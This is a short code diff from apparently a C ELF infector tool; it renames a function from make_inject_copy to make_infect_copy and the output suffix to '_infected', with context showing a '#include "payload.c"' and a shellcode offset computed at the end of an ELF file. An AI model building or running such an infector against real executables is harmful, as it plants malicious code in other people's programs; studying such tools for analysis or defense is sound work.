@@ -11,11 +11,11 @@
 
 #include "payload.c"
 
-int make_inject_copy(const char *filename) {
+int make_infect_copy(const char *filename) {
 	char buffer[4096];
 	char new_filename[PATH_MAX];
 
-	snprintf(new_filename, PATH_MAX, "%s_injected", filename);
+	snprintf(new_filename, PATH_MAX, "%s_infected", filename);
 
 	int from = open(filename, O_RDONLY);
 	if (from == -1) {
@@ -46,7 +46,7 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 
-	int fd = make_inject_copy(argv[1]);
+	int fd = make_infect_copy(argv[1]);
 	size_t fd_sz;
 	Elf64_Off shellcode_offset = fd_sz = lseek(fd, 0, SEEK_END);
 	lseek(fd, 0, SEEK_SET);
